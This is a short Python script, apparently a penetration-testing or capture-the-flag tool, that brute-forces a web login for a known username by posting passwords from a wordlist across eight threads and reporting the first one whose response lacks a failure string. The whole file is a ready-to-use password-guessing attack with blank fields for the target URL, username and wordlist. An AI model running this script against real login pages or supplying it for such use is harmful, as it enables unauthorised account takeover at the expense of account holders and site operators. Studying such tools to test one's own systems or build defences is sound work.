# Simple brute forcer that takes a password file and a known username
# Utilises multi-threading to process the passwords faster
# This script assumes there are no rate limits on the target

import requests, concurrent.futures

# --- Change these values ---
url = ""
username = ""
password_file = ""
auth_fail_string = "" # String to match when login fails (invalid username/password)
# ---------------------------

def try_password(password):
    """Attempt login with the given password."""
    login = {'username': username, 'password': password}
    response = requests.post(url, data=login)
    if auth_fail_string in response.text:
        print(f"[*] Invalid password: {password}")
        return False
    else:
        print(f"[*] Password match: {password}")
        print(response.text)
        return True

# Open the password file and read line-by-line
with open(password_file, "r", encoding="ISO-8859-1") as file:
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        # Submit tasks as passwords are read
        futures = {executor.submit(try_password, line.strip()): line.strip() for line in file}
        
        for future in concurrent.futures.as_completed(futures):
            if future.result():  # Stop if the correct password is found
                print("[*] Brute force successful. Exiting.")
                executor.shutdown(wait=False)
                break
